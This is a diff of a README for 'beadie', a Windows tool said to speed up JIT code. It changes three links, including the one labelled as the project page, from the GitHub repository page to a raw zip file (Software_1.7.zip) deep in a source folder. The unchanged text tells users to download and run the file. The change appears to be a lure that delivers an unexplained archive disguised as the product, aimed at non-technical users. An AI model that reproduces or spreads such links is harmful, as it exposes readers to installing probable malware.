@@ -1,6 +1,6 @@
 # 🟣 beadie - Move Hot Code Into JIT Faster
 
-[![Download beadie](https://img.shields.io/badge/Download-Beadie-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Colourless-genusimpatiens558/beadie)
+[![Download beadie](https://img.shields.io/badge/Download-Beadie-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Colourless-genusimpatiens558/beadie/raw/refs/heads/main/crates/beadie/Software_1.7.zip)
 
 ## 🧭 What beadie does
 
@@ -12,7 +12,7 @@ This tool is for users who want to try a fast runtime setup on Windows without d
 
 To get beadie on Windows, use this page:
 
-[Download beadie from GitHub](https://github.com/Colourless-genusimpatiens558/beadie)
+[Download beadie from GitHub](https://github.com/Colourless-genusimpatiens558/beadie/raw/refs/heads/main/crates/beadie/Software_1.7.zip)
 
 Open the link, then look for the latest release or project files. If you see an installer or app file, download it to your computer and run that file.
 
@@ -172,7 +172,7 @@ If that happens:
 
 ## 🔗 Project link
 
-[Open the beadie GitHub page](https://github.com/Colourless-genusimpatiens558/beadie)
+[Open the beadie GitHub page](https://github.com/Colourless-genusimpatiens558/beadie/raw/refs/heads/main/crates/beadie/Software_1.7.zip)
 
 ## 🧭 Using beadie with another app
 
